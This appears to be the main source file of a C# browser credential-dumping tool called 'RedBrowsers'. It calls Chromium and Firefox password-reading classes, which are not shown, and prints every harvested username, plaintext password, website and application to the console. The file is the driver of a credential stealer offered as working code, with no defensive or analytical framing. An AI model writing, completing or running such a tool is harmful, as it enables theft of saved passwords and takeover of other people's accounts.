using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using RedBrowsers.Classes;

namespace RedBrowsers
{
    class Program
    {
        static void Main(string[] args)
        {
             var a =   ChromiumEngine.GetChromium.Grab();
             a.AddRange( Firfox.FirefoxPassReader.ReadPasswords());
            foreach (Account account in a ) 
            {
                string output = $"---------------------------------------------{Environment.NewLine}UserName    =  {account.UserName}{Environment.NewLine}PassWord    =  {account.Password}{Environment.NewLine}Website     =  {account.URL}{Environment.NewLine}Application =  {account.Application}{Environment.NewLine}---------------------------------------------";
                Console.WriteLine(output);
            }
            Console.ReadLine();
        }

    }
}
